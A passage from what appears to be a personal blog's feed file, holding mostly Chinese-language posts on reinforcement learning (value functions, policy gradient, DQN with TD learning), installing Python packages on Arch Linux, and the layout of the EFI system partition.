class="math inline">\(\pi(left|s) = 0.2\)</span></li><li><span class="math inline">\(\pi(right|s) = 0.2\)</span></li><li><span class="math inline">\(\pi(up|s) = 0.2\)</span></li><li><span class="math inline">\(\pi(down|s) = 0.2\)</span>根据选取的策略不同（随机性策略或者确定性策略），从中随机选取或者选取概率最大的action 进行实施。</li></ul></li><li><p>reward</p></li><li><p>state transition</p><p><span class="math inline">\(old state \xrightarrow{action} newstate\)</span></p><ul><li>State transation can be random</li><li>Randomness is from theenvironment(状态转移的随机性取决于环境，这里的环境就是游戏程序)</li><li>状态转移，用 p 函数表示： <spanclass="math inline">\(p(s^{&#39;}|s,a) =\mathbb{P}(s^{&#39;}=s,A=a)\)</span>, 如果观察到当前状态 s 和动作 a，P函数输出状态变为 <span class="math inline">\(p(s^{&#39;}\)</span>的概率。</li></ul></li><li><p>agent environment interaction</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201214194035.png"alt="20201214194035" /><figcaption aria-hidden="true">20201214194035</figcaption></figure></li></ol><h3 id="randomness-in-reinforcement-learning">Randomness inReinforcement learning</h3><ol type="1"><li><p>Actions have randomness</p><p>Given state 𝑠, the action can be random</p></li><li><p>State transitions have randomness</p><p>Given state 𝑆 = 𝑠 and action 𝐴 = 𝑎, the environment randomlygenerates a new state <spanclass="math inline">\(𝑆^{&#39;}\)</span></p></li></ol><h3 id="rewards-and-returns">Rewards and Returns</h3><h3 id="return">Return</h3><p>Definition: Return (aka cumulative future reward) <spanclass="math inline">\(𝑈_{t} = 𝑅_{t} + 𝑅_{t+1} + 𝑅_{t+2} + 𝑅_{t+3} +⋯\)</span></p><ul><li>Future reward is less valuable than present reward.</li><li><span class="math inline">\(R_{t+1}\)</span> should be given lessweight than <span class="math inline">\(𝑅_{t}\)</span></li></ul><h3 id="discounted-return">Discounted return</h3><p>Definition: <strong>Discounted</strong> return (aka cumulative<strong>discounted</strong> future reward)</p><ul><li><span class="math inline">\(\gamma\)</span>: discount rate (tuninghyper-parameter)</li><li><span class="math inline">\(𝑈_{t} = 𝑅_{t} + \gamma𝑅*{t+1} +\gamma^2𝑅*{t+2} + \gamma^3𝑅_{t+3} + ⋯\)</span></li></ul><p>At time step 𝑡, the return <span class="math inline">\(𝑈_{t}\)</span>is random. Two sources of randomness:</p><ol type="1"><li>Action can be random: <spanclass="math inline">\(ℙ[𝐴=𝑎|𝑆=𝑠]=𝜋(𝑎|𝑠)\)</span></li><li>New state can be random: <spanclass="math inline">\(ℙ[𝑆^{&#39;}=𝑠^{&#39;}|𝑆=𝑠,𝐴=𝑎]=𝑝(𝑠^{&#39;}|𝑠,𝑎)\)</span><ul><li>For any 𝑖 ≥ 𝑡, the reward 𝑅n depends on 𝑆n and 𝐴n.</li><li>Thus, given 𝑠<em>, the return 𝑈</em> depends on the randomvariables:</li><li><span class="math inline">\(𝐴_{t},𝐴_{t+1},𝐴_{t+2},⋯\)</span> and<span class="math inline">\(𝑆_{t+1},𝑆_{t+2},⋯\)</span></li></ul></li></ol><h3 id="action-value-function-𝑄sa">Action-Value Function 𝑄(s,a)</h3><p>Definition: Action-value function for policy 𝜋</p><p><span class="math inline">\(𝑄_{\pi}(𝑠_{t},𝑎_{t}) =\mathbb{E}[𝑈_{t}|𝑆_{t}=𝑠_{t}, 𝐴_{t}=𝑎_{t}]\)</span></p><ul><li>Return <span class="math inline">\(𝑈_{t}\)</span> depends on states<span class="math inline">\(𝑆_{t},𝑆_{t+1},S_{t+2},⋯\)</span> and actions<span class="math inline">\(A_{t},A_{t+1},A_{t+2},⋯\)</span></li><li>将随机变量 <span class="math inline">\(𝑈_{t}\)</span>当作未来所有状态 S 以及未来所有动作 A的一个函数求期望，将这些变量积分积掉，得到一个数 <spanclass="math inline">\(𝑄_{\pi}\)</span>。</li><li><span class="math inline">\(𝑆_{t}, A_{t}\)</span>被作为观测到的数值而对待，没有被积掉了。因此 <spanclass="math inline">\(𝑄_{\pi}\)</span> 的值与 <spanclass="math inline">\(𝑆_{t}, A_{t}\)</span> 有关。</li><li>积分的时候会用到 Policy 函数，如果 Policy 函数 <spanclass="math inline">\(\pi\)</span> 不一样，积分得到的函数 <spanclass="math inline">\(𝑄_{\pi}\)</span> 就不一样。</li></ul><p>未来状态和动作都有随机性</p><ul><li>Actions are random: <spanclass="math inline">\(\mathbb{P}[A=a|S=s]=\pi(a|s)\)</span>, 动作 A的概率密度函数是 Policy function <spanclass="math inline">\(\pi\)</span></li><li>States are random: <spanclass="math inline">\(\mathbb{P}[S^{&#39;}=s^{&#39;}|A=a]=p(s^{&#39;}|s,a)\)</span>,状态 S 的概率密度函数是 state transition function p.</li></ul><p><span class="math inline">\(𝑄_{\pi}\)</span> 的意义：采取策略 <spanclass="math inline">\(\pi\)</span>，在 <spanclass="math inline">\(S_{t}\)</span> 状态下，动作 <spanclass="math inline">\(A_{t}\)</span> 的好坏。</p><h3 id="optimal-action-value-function">Optimal action-valuefunction</h3><p>用不同的策略 <span class="math inline">\(\pi\)</span>， 就有不同的<span class="math inline">\(𝑄_{\pi}\)</span>， 那如何将 Action-Valuefunction 中的 <span class="math inline">\(\pi\)</span> 去掉呢？答案是：<span class="math inline">\(𝑄_{\pi}\)</span> 关于 <spanclass="math inline">\(\pi\)</span> 求最大化。</p><p>Definition: Optimal action-value function.</p><p><span class="math inline">\(Q^{\star}\left(s_{t},a_{t}\right)=\underset{\pi}{\max} Q_{\pi}\left(s_{t},a_{t}\right)\)</span></p><p>使用最好的策略 <span class="math inline">\(\pi\)</span>（也就是使得<span class="math inline">\(𝑄_{\pi}\)</span> 函数最大化的那个 <spanclass="math inline">\(\pi\)</span>），因此 <spanclass="math inline">\(Q^{\star}\)</span> 与 <spanclass="math inline">\(\pi\)</span> 无关了，它只与 <spanclass="math inline">\(S_{t}, A_{t}\)</span> 有关。</p><p><span class="math inline">\(Q^{\star}\)</span> 的意义：在某个状态 s下，对动作 a 做评价。</p><h3 id="state-value-function">State-value function</h3><ul><li><span class="math inline">\(V_{\pi}(s_{t}) =\mathbb{E_{A}}[Q_{\pi}(s_{t}, A)] = \sum{\pi(a|s_{t})\cdotQ_{\pi}(s_{t},a)}\)</span> (Actions are discrete)</li><li><span class="math inline">\(V_{\pi}(s_{t}) =\mathbb{E_{A}}[Q_{\pi}(s_{t}, A)] = \int{\pi(a|s_{t})\cdotQ_{\pi}(s_{t},a)}da\)</span> (Actions are continuous)</li></ul><p>将动作 A 当作随机变量，对其进行积分求期望， 其中 A 的概率密度函数<span class="math inline">\(A~\pi(\cdot|s_{t})\)</span>，将 A 消掉，然后<span class="math inline">\(V_{\pi}\)</span> 函数就只与 <spanclass="math inline">\(\pi\)</span> 和 S 有关。</p><p>意义：<span class="math inline">\(V_{\pi}\)</span>可以告诉我们当前的局势状况好坏优劣。</p><h3 id="value-functions">Value Functions</h3><ol type="1"><li><p>Action-value function</p><p><span class="math inline">\(𝑄_{\pi}(𝑠_{t},𝑎_{t}) =\mathbb{E}[𝑈_{t}|𝑆_{t}=𝑠_{t}, 𝐴_{t}=𝑎_{t}]\)</span></p><p>For policy <span class="math inline">\(\pi\)</span>, <spanclass="math inline">\(𝑄_{\pi}(𝑠_{t},𝑎_{t})\)</span> evaluates how goodit is for an agent to pick action <strong>a</strong> while being instate <strong>s</strong>.</p></li><li><p>State value function</p><p><span class="math inline">\(V_{\pi}(s*{t}) =\mathbb{E_{A}}[Q_{\pi}(s_{t}, A)] = \sum_{a} \pi\left(a \mids_{t}\right) \cdot Q_{\pi}\left(s_{t}, a\right)\)</span></p><p>如果动作 A 的概率密度函数 <span class="math inline">\(\pi\)</span>是离散的,则 <span class="math inline">\(V_{\pi}\)</span>可以进一步写成求和的形式；如果是连续的，则可写为积分形式。</p><p>For fixed policy <span class="math inline">\(\pi\)</span>, <spanclass="math inline">\(V_{\pi}(s_{t})\)</span> evaluates how good thesituation is in state <strong>s</strong>.</p><p><span class="math inline">\(\mathbb{E}_{s}[V_{\pi}(S)]\)</span>evaluates how good the policy <span class="math inline">\(\pi\)</span>is.</p></li></ol><h2 id="two-methods">Two Methods</h2><ol type="1"><li><p>Policy-based：Suppose we have a good policy <spanclass="math inline">\(\pi(a|s)\)</span>.</p><ul><li>Upon observing the state <spanclass="math inline">\(S_{t}\)</span></li><li>random sampling <spanclass="math inline">\(a_{t}~\pi(\cdot|s_{t})\)</span></li></ul></li><li><p>Value-based：Suppose we know the optimal action-value function<span class="math inline">\(Q^{\star}(s|a)\)</span></p><ul><li>Upon observe the state <spanclass="math inline">\(S_{t}\)</span></li><li>choose the <strong>action</strong> that maximizes the value <spanclass="math inline">\(a_{t} = argmax_{a}Q^{\star}(s_{t},a)\)</span></li></ul></li></ol><h2 id="几种分类">几种分类</h2><table><thead><tr class="header"><th>通过价值选行为</th><th>直接选行为</th><th>想象环境并从中学习</th></tr></thead><tbody><tr class="odd"><td>Q learing</td><td>Policy Gradient</td><td>Model based Rl</td></tr><tr class="even"><td>Sarsa</td><td></td><td></td></tr><tr class="odd"><td>Deep Q Network</td><td></td><td></td></tr></tbody></table><h3 id="理解环境">理解环境</h3><p>根据理解环境与否， 分为 Model-Free RL 与 Model-Based RL</p><ol type="1"><li><p>Model-Free</p><p>特点：不尝试理解环境，根据环境的反馈一步步学习 代表：QLearning、Sarsa、Policy Gradients</p></li><li><p>Mode-Based</p><p>特点：建模，可以自己训练</p></li></ol><h3 id="概率与价值">概率与价值</h3><p>基于概率(Policy-Based RL)、基于价值(Value-Based RL)</p><ol type="1"><li><p>基于概率(Policy-Based RL)</p><p>根据所处的环境，判断下一步行动的概率，每一种动作都有可能被选中，只是可能性大小不同使用连续的概率分布处理选择连续的动作 代表：Policy Gradients</p></li><li><p>基于价值(Value-Based RL)</p><p>直接选择价值最高的动作；无法处理连续的动作 代表：QLearning、Sarsa</p></li><li><p>结合 Policy 和 Value 的 Actor-Critic</p><p>Actor： 基于概率做出动作 Critic： 根据做出的动作给出价值</p></li></ol><h3 id="更新频率">更新频率</h3><ol type="1"><li><p>回合更新(Monte-Carlo update) 等待每次训练结束，进行更新代表：基础版 Policy Gradients、Monte-Carlo Learing</p></li><li><p>单步更新(Temporal-Difference update) 训练过程中的每一步都进行更新代表：Q Learning、Sarsa、升级版 Policy Gradients</p></li></ol><h3 id="在线与离线">在线与离线</h3><ol type="1"><li><p>在线学习 本人在场，边玩边学习 代表：Sarsa、Sarsa(Lambda)</p></li><li><p>离线学习 可以从他人的经历中进行学习也可以白天存储学习经验，晚上离线学习 代表：Q Learning、Deep QNetwork</p></li></ol><h2 id="going-to-learn">Going to learn</h2><ol type="1"><li><p>Value-based learning.</p><ul><li>Deep Q network (DQN) for approximating <spanclass="math inline">\(𝑄^{\star}(𝑠|𝑎)\)</span>.</li><li>Learn the network parameters using temporal different(TD).</li></ul></li><li><p>Policy-based learning.</p><ul><li>Policy network for approximating 𝜋(𝑎|𝑠).</li><li>Learn the network parameters using <strong>policygradient</strong>.</li></ul></li><li><p>Actor-critic method. (Policy network + value network.)</p></li><li><p>Example: AlphaGo</p></li></ol><h2 id="资料">资料</h2><ol type="1"><li>2015 年 David Silver 的经典课程<ahref="http://www0.cs.ucl.ac.uk/staff/D.Silver/web/Teaching.html">Teaching</a></li><li>2017 年加州大学伯克利分校 Levine, Finn, Schulman 的课程 <ahref="http://rll.berkeley.edu/deeprlcourse/">CS 294 Deep ReinforcementLearning, Spring 2017</a></li><li>卡内基梅隆大学的 2017 春季课程<ahref="https://katefvision.github.io/">Deep RL and Control</a>。</li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
          <category> rl </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Policy-based Method of RL</title>
      <link href="/blog/2020/12/17/ml/rl/policy_based/"/>
      <url>/blog/2020/12/17/ml/rl/policy_based/</url>
      
        <content type="html"><![CDATA[<p>Policy function 𝜋(𝑎|𝑠) 用来指导 agent 去运动，它接受一个状态 s作为输入，输出所有动作的概率，agent 从所有动作中采样选取一个动作 a执行。</p><p>Can we directly learn a policy function 𝜋(𝑎|𝑠)?</p><ul><li>If there are only a few states and actions, then yes, we can.</li><li>Draw a table (matrix) and learn the entries.</li><li>What if there are too many (or infinite) states or actions?</li></ul><h2 id="policy-network-𝜋𝑎𝑠𝛉">Policy Network 𝜋(𝑎|𝑠;𝛉)</h2><p>近似函数常用的是线性回归和神经网络。</p><p>Policy network: Use a neural net to approximate 𝜋(𝑎|𝑠;𝛉).</p><ul><li>Use policy network 𝜋(𝑎|𝑠;𝛉) to approximate 𝜋(𝑎|𝑠;𝛉).</li><li>𝛉: trainable parameters of the neural net</li></ul><p><span class="math inline">\(\sum_{a \in \mathcal{A}}\pi\left(\left.a\right|{s} ; \boldsymbol{\theta}\right)=1\)</span></p><h2 id="state-value-function">State-value function</h2><p><spanclass="math inline">\(V_{\pi}\left(s_{t}\right)=\mathbb{E}_{A}\left[Q_{\pi}\left(s_{t},A\right)\right]=\sum_{a} \pi\left(a \mid s_{t}\right) \cdotQ_{\pi}\left(s_{t}, a\right)\)</span></p><h3 id="approximate-state-value-function">Approximate state-valuefunction</h3><ul><li>Approximate policy function <spanclass="math inline">\(\pi(a|s_{t})\)</span> by policy network <spanclass="math inline">\(\pi(a|s_{t};\theta)\)</span>.</li><li>Approximate value function <spanclass="math inline">\(V_{\pi}\left(s_{t}\right)\)</span> by: <spanclass="math inline">\(V\left(s_{t} ; \boldsymbol{\theta}\right)=\sum_{a}\pi\left(a \mid s_{t} ; \boldsymbol{\theta}\right) \cdotQ_{\pi}\left(s_{t}, a\right)\)</span></li></ul><p>Policy-based learning: Learn 𝛉 that maximizes <spanclass="math inline">\(J(\boldsymbol{\theta})=\mathbb{E}_{S}[V(S ;\boldsymbol{\theta})]\)</span></p><p>Policy gradient ascent to improve 𝛉:</p><ul><li>Observe state s</li><li>Update policy by: <span class="math inline">\(\theta \leftarrow\theta + \beta \cdot \frac{\partial V(s;\theta)}{\partial\theta}\)</span></li><li>Policy gradient: <span class="math inline">\(\frac{\partialV(s;\theta)}{\partial \theta}\)</span></li></ul><h2 id="policy-gradient">Policy gradient</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216104659.png"alt="form_1" /><figcaption aria-hidden="true">form_1</figcaption></figure><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216104712.png"alt="form_2" /><figcaption aria-hidden="true">form_2</figcaption></figure><h3 id="calculate-policy-gradient-for-discrete-actions">Calculate PolicyGradient for Discrete Actions</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216105014.png"alt="discrete_action" /><figcaption aria-hidden="true">discrete_action</figcaption></figure><h3 id="calculate-policy-gradient-for-continuous-actions">CalculatePolicy Gradient for Continuous Actions</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216105826.png"alt="continuous_action" /><figcaption aria-hidden="true">continuous_action</figcaption></figure><h3 id="update-policy-network-using-policy-gradient">Update policynetwork using policy gradient</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216110804.png"alt="algorithm" /><figcaption aria-hidden="true">algorithm</figcaption></figure><p>Two Options:</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216133540.png"alt="options" /><figcaption aria-hidden="true">options</figcaption></figure><h2 id="summary">Summary</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216133836.png"alt="summary" /><figcaption aria-hidden="true">summary</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
          <category> rl </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Value-based Method of RL</title>
      <link href="/blog/2020/12/17/ml/rl/value_based/"/>
      <url>/blog/2020/12/17/ml/rl/value_based/</url>
      
        <content type="html"><![CDATA[<h2 id="deep-q-network">Deep Q-Network</h2><p>Goal: Win the game (≈ maximize the total reward.)</p><p>Question: If we know <spanclass="math inline">\(𝑄^{\star}(𝑠|𝑎)\)</span>, what is the bestaction?</p><ul><li>Obviously, the best action is <span class="math inline">\(a_{t} =argmax_{a}Q^{\star}(s_{t},a)\)</span></li></ul><p>Challenge: We do not know <spanclass="math inline">\(𝑄^{\star}(𝑠|𝑎)\)</span>.</p><ul><li>Solution: Deep Q Network (DQN)</li><li>Use neural network <span class="math inline">\(𝑄(𝑠,𝑎;𝐰)\)</span> toapproximate <span class="math inline">\(𝑄^{\star}(𝑠|𝑎)\)</span>, DQN输入当前状态 S，输出动作空间</li></ul><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215201250.png"alt="20201215201250" /><figcaption aria-hidden="true">20201215201250</figcaption></figure><h2 id="apply-dqn-to-play-game">Apply DQN to Play Game</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215201448.png"alt="20201215201448" /><figcaption aria-hidden="true">20201215201448</figcaption></figure><ol type="1"><li>观察环境, 获取状态 <span class="math inline">\(s_{t}\)</span>,也就是 Observation</li><li>向 DQN 输入状态 <spanclass="math inline">\(s_{t}\)</span>，获得使其最大化的动作 <spanclass="math inline">\(a_{t}\)</span></li><li>环境接受到 agent 的动作影响，通过状态转移函数 <spanclass="math inline">\(s_{t+1}~p(\cdot|s_{t},a_{t})\)</span>获取下一个状态 <span class="math inline">\(s_{t+1}\)</span></li><li>环境同时给出本轮的 reward</li></ol><h2 id="状态价值函数的估算">状态价值函数的估算</h2><h3 id="monte-carlo-policy-evaluation">Monte-Carlo PolicyEvaluation</h3><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215204309.png"alt="20201215204309" /> <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215203942.png"alt="20201215203942" /></p><h3 id="时序差分方法-temporal-difference-td----单步更新">时序差分方法Temporal-difference (TD) -- 单步更新</h3><ul><li>Can I update the model before finishing the trip？</li><li>Can I get a better 𝐰 as soon as I arrived at DC?</li></ul><p>That's TD learning!</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215204718.png"alt="20201215204718" /><figcaption aria-hidden="true">20201215204718</figcaption></figure><p>TD error</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215204809.png"alt="20201215204809" /><figcaption aria-hidden="true">20201215204809</figcaption></figure><h4 id="apply-td-learning-to-dqn">Apply TD learning to DQN</h4><p>想要使用 TD算法，必须等式左边有一项，右边有两项，右边两项中有一项为真实观测到的。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215205216.png"alt="20201215205216" /><figcaption aria-hidden="true">20201215205216</figcaption></figure><p>简要的推导证明：</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215205708.png"alt="20201215205708" /><figcaption aria-hidden="true">20201215205708</figcaption></figure><h4 id="train-dqn-using-td-learning">Train DQN using TD learning</h4><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215211053.png"alt="20201215211053" /><figcaption aria-hidden="true">20201215211053</figcaption></figure><p><span class="math inline">\(Q(s_{t+1},a_{t+1}, w_{t})\)</span>的值实际上等于把 a 当作变量求得的最大化 Q 值</p><h4 id="one-iteration-of-td-learning">One iteration of TD learning</h4><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201215211400.png"alt="20201215211400" /><figcaption aria-hidden="true">20201215211400</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
          <category> rl </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>正确安装 Python 包</title>
      <link href="/blog/2020/10/10/programming/python/issues/pkg_install/"/>
      <url>/blog/2020/10/10/programming/python/issues/pkg_install/</url>
      
        <content type="html"><![CDATA[<h2 id="sudo-install-vs-pip-install---user">sudo install vs pip install--user</h2><p>先放结论：推荐使用<code>pip install --user package_name</code></p><ol type="1"><li><p><code>sudo pip install</code> Both <code>sudo pip install</code>and its other common variant <code>sudo -H pip install</code> should notbe encouraged because it is a security risk to use root privileges touse <code>pip</code> to install Python packages from PyPI (PythonPackage Index).</p><p>当你使用 sudo 运行 pip 时，你以 sudo权限运行<code>setup.py</code>。换句话说，你在以 sudo权限运行一段从网络上下载的 Python 代码，存在极大的安全隐患。</p></li><li><p><code>pip install --user</code></p><p>该命令将 python包安装到本地用户目录，例如：<code>~/.local/lib/python</code></p></li></ol><h2 id="arch-linux-上安装-python-包">Arch Linux 上安装 Python 包</h2><p>诸如 Arch Linux、Ubuntu 等发行版自带包管理器，例如： Arch Linux 的pacman，而 Python 又常用 pip 作为其包管理器，那我们该使用哪一种呢？</p><p>一个原则：坚持用一种包管理器</p><p>建议：</p><ol type="1"><li><p>在可用的情况下，优先使用 pacman 包管理器安装 Python 包</p><p>Python3: <code>sudo pacman -S python-'package'</code></p><p>例如：<code>pacman -S python-bs4</code></p><p>Python2: <code>sudo pacman -S python2-'package'</code></p><p>大多数包都可以通过 pacman 进行安装，当一些包既没有在 ArchLinux仓库，又没有在 AUR 的时候，你需要下载 PKGBUILD 文件，编译然后使用 pacman安装</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">makepkg -s</span><br><span class="line">sudo pacman -U &#x27;compiled-package&#x27;</span><br></pre></td></tr></table></figure></p></li><li><p>pacman 安装不来（仓库里没有）的时候，使用 pip 安装</p><p>当 AUR 中没有该包或者 PKGBUILD 不管用时，使用 pip 安装格式：<code>pip install --user package_name</code></p><p>Python3: <code>sudo pip install 'python-package'</code> Python2:<code>sudo pip2 install 'python-package'</code></p><p>注意：确保包只安装在你的家目录下，以避免与系统包混淆。</p><blockquote><p>Never install anything with pip without --user, it will install filesto the system and conflict with pacman</p></blockquote></li><li><p>对于 Python项目(因为项目的依赖包不是常用)，所以一般使用虚拟环境</p><p>例如：<code>virtualenv</code></p><p><code>sudo pacman -S python-virtualenv</code></p></li></ol><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><a href="https://bbs.archlinux.org/viewtopic.php?id=139264">Betterto install PyPI packages using pacman or pip?</a></li><li><ahref="https://www.reddit.com/r/archlinux/comments/dzbbgc/pacman_or_pip/">Pacmanor pip?</a></li><li><ahref="https://askubuntu.com/questions/802544/is-sudo-pip-install-still-a-broken-practice">Is<code>sudo pip install</code> still a broken practice?</a></li><li><ahref="https://stackoverflow.com/questions/29310688/sudo-pip-install-vs-pip-install-user">sudopip install VS pip install --user</a></li><li><ahref="https://unix.stackexchange.com/questions/76389/recommended-way-of-installing-python-packages-on-arch">Recommendedway of installing python packages on Arch</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>EFI 初识</title>
      <link href="/blog/2020/09/30/os/efi/"/>
      <url>/blog/2020/09/30/os/efi/</url>
      
        <content type="html"><![CDATA[<p>UEFI+GPT 的结构的分区样子是：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200929165639.png"alt="partition" /><figcaption aria-hidden="true">partition</figcaption></figure><p>三个分区：恢复分区、ESP（一般为 FAT32 隐藏分区）、MSR分区（没什么用，不用管）</p><h2 id="efi">EFI</h2><p>The EFI system partition (also called ESP) is an OS independentpartition that acts as the storage place for the EFI bootloaders,applications and drivers to be launched by the UEFI firmware. It ismandatory for UEFI boot. 其中 Boot Loader是在操作系统内核运行之前运行的一段小程序。这段小程序可以将系统的软硬件环境带到一个合适的状态，以便为最终调用操作系统内核准备好正确的环境。</p><p>EFI 系统分区,带有 efi、boot 标志标记，因此 ESP不再限制必须要放在开头的第一个分区里面，它可以在整块硬盘的任意一个分区位置。扫描寻找ESP 的时候是从前向后扫描，因此默认情况下最先找到的是硬盘中靠前的ESP，并对其中的 efi 进行加载。</p><p>The UEFI specification mandates support for the FAT12, FAT16, andFAT32 file systems, but any conformant vendor can optionally add supportfor additional file systems; for example, the firmware in Apple Macssupports the HFS+ file system.</p><p>通常情况下，ESP 的大小至少为 100 MB，文件系统格式为FAT-12/16/32。实际情况下，ESP 一般设置为 100MB 的 FAT32 分区。在 Linux上一般将其挂载到 <code>/boot/efi</code>。为了确认它是否是ESP,可以挂载，然后检查它是否包含名为 EFI 的目录，如果包含，则为ESP。</p><p>Win+Linux 双系统 ESP（The EFI system partition）文件结构：</p><blockquote><p>其中<code>***</code>表示多行类似文件，我手动改的，因为行数太多了</p></blockquote><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">├── Boot</span><br><span class="line">│   └── bootx64.efi</span><br><span class="line">├── EFI.txt</span><br><span class="line">├── Manjaro</span><br><span class="line">│   └── grubx64.efi</span><br><span class="line">└── Microsoft</span><br><span class="line">    ├── Boot</span><br><span class="line">    │   ├── BCD</span><br><span class="line">    │   ├── BCD.LOG</span><br><span class="line">    │   ├── BCD.LOG1</span><br><span class="line">    │   ├── BCD.LOG2</span><br><span class="line">    │   ├── bootmgfw.efi</span><br><span class="line">    │   ├── bootmgr.efi</span><br><span class="line">    │   ├── BOOTSTAT.DAT</span><br><span class="line">    │   ├── boot.stl</span><br><span class="line">    │   ├── en-US</span><br><span class="line">    │   │   ├── bootmgfw.efi.mui</span><br><span class="line">    │   │   ├── bootmgr.efi.mui</span><br><span class="line">    │   │   └── memtest.efi.mui</span><br><span class="line">    │   ├── Fonts</span><br><span class="line">    │   │   ├── chs_boot.ttf</span><br><span class="line">    │   │   ├── ××××××××</span><br><span class="line">    │   │   └── wgl4_boot.ttf</span><br><span class="line">    │   ├── kd_02_10df.dll</span><br><span class="line">    │   ├── ××××××××</span><br><span class="line">    │   ├── kdstub.dll</span><br><span class="line">    │   ├── memtest.efi</span><br><span class="line">    │   ├── qps-ploc</span><br><span class="line">    │   │   └── memtest.efi.mui</span><br><span class="line">    │   ├── Resources</span><br><span class="line">    │   │   ├── bootres.dll</span><br><span class="line">    │   │   ├── en-US</span><br><span class="line">    │   │   │   └── bootres.dll.mui</span><br><span class="line">    │   │   └── zh-CN</span><br><span class="line">    │   │       └── bootres.dll.mui</span><br><span class="line">    │   ├── winsipolicy.p7b</span><br><span class="line">    │   ├── zh-CN</span><br><span class="line">    │   │   ├── bootmgfw.efi.mui</span><br><span class="line">    │   │   ├── bootmgr.efi.mui</span><br><span class="line">    │   │   └── memtest.efi.mui</span><br><span class="line">    │   └── zh-TW</span><br><span class="line">    │       ├── bootmgfw.efi.mui</span><br><span class="line">    │       ├── bootmgr.efi.mui</span><br><span class="line">    │       └── memtest.efi.mui</span><br><span class="line">    └── Recovery</span><br><span class="line">        ├── BCD</span><br><span class="line">        ├── BCD.LOG</span><br><span class="line">        ├── BCD.LOG1</span><br><span class="line">        └── BCD.LOG2</span><br><span class="line">13 directories, 58 files</span><br></pre></td></tr></table></figure><h2 id="nvram">NVRAM</h2><p>NVRAM is the non-volatile storage that contains the firmwaresettings, which on classic PCs was also known as CMOS memory but onmodern systems may actually use some technology other than CMOS(Complementary Metal Oxide Semiconductor)</p><h2 id="efibootbootx64.efi"><code>\EFI\Boot\bootx64.efi</code></h2><p>The <code>\EFI\Boot\bootx64.efi</code> program is a fallback for whenthe EFI hasn't been configured with any NVRAM boot entries that refer toother boot programs on the disk. It's important for removable media likebootable CDs and USB drives, but <strong>on a hard drive, it's generallynot used</strong>.</p><p>Windows will install a copy of its bootloader to this pathautomatically as a fail-safe; when installing GRUB, the<code>grub-install</code> (or <code>grub2-install</code> depending onLinux distribution) command may also put a copy of the respectivebootloader here if it does not already exist. If you want, you can use<code>grub-install --removable</code> to tell it to install to thefallback boot path, or <code>grub-install --force-extra-removable</code>to overwrite any existing bootloader in the fallback path and replace itwith GRUB.</p><p>If you want to create a Secure Boot-compatible USB stick for UEFI,you should place a copy of the shim as <code>EFI\boot\bootx64.efi</code>and a copy of GRUB as <code>EFI\boot\grubx64.efi</code>, as the shimbootloader will look for <code>grubx64.efi</code> in the same directorythe shim bootloader is in.</p><h2id="efimicrosoftbootbootmgfw.efi"><code>\EFI\Microsoft\Boot\bootmgfw.efi</code></h2><p><code>bootmgfw.efi</code> isn't Windows bootloader, it's Windows BootManager, <code>\Windows\System32\winload.efi</code> is called Windowsbootloader</p><h2 id="secure-boot-shimx64.efi-and-the-reasons-for-it">Secure Boot:<code>shimx64.efi</code> and the reasons for it</h2><p>Secure Boot requires that a bootloader must be signed by acertificate that is included in the system's Secure Boot NVRAM 